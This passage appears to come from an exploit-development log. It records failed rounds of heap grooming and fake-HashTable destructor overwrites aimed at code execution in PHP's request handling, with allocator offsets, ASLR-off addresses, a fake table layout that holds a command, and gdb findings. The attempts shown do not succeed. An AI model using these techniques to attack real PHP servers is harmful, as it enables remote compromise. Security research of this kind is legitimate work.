`ad+0x30`, caller bucket at `ad+0x40`) so it lies wholly in groom/user data.

### Round 42.4 — 288-byte groom also misses; arData is a recycled table

Marker run with `--groom-len 288` (bin 384, matching the arData chunk):
identical dump, no `G00`..`G19` at `blk`/`ad`.

The arData block is a **recycled HashTable arData** (288 + 0x40 header = 352,
bin 384), not a raw string buffer. Evidence: the stale bucket at `ad+0x10`
(`0x800000310f703038`, `0x00007ffff6856360`). The groom values are alive in
`$_POST`, so they never re-enter the allocator to be reused by the arData.

Path1 embed is blocked on a missing write primitive, not on allocation tagging:
- fake HT at `blk` is in the 0x40-byte `zend_mm` chunk header, not a raw buffer;
- real `ht->pDestructor` at `ht+0x30` (HT at 0x7ffff685b0e0) is not a groom chunk;
- the bucket at `ad` is written by `zend_hash_destroy` itself.

Next: port the FPM/session E0 destructor-entry write (write to `ht+0x30`) to
path1, or keep path1 as gdb-only.

## Round 43 — E0-style partial-bucket destructor entry ported to path1 (negative)

Implemented `--big-fake`/`--big-addr`/`--file-groom` in `path1_body.py`:
- `b0000` holds a fake table/frame at `big` (`pDestructor` at `big+0x30`,
  `arData` at `big+0x60`, frame, fake zend_string, command);
- a 288-byte file part before the final carries the partial bucket val
  `val.ptr=big`, `type=IS_ARRAY`.

ASLR-off bases: `big=0x7fffebd1c000` (measured at `zend_array_destroy`),
`zif=0x7ffff37996e0`.

Result: HTTP 500 at the final-key OOM; `/tmp/p1hash` empty. A gdb log of all
73,418 `zend_array_destroy` calls has no bucket 0 equal to `big`. The `files`
array's arData reuses the old `$_POST` arData; its bucket 0 is the first
`$_POST` field (`0x40200258`, IS_STRING; 1,089 hits), not the freed file part
value. The partial bucket can select that bucket's `val`/`type` only; it
cannot write the array HT's `pDestructor`.

Conclusion: the E0-style port does not replace the missing `HT+0x30` write.
Path1 remains gdb-only unless a session/unserialize-style `var_tmp_var` write
can be introduced on the mod_php request path.
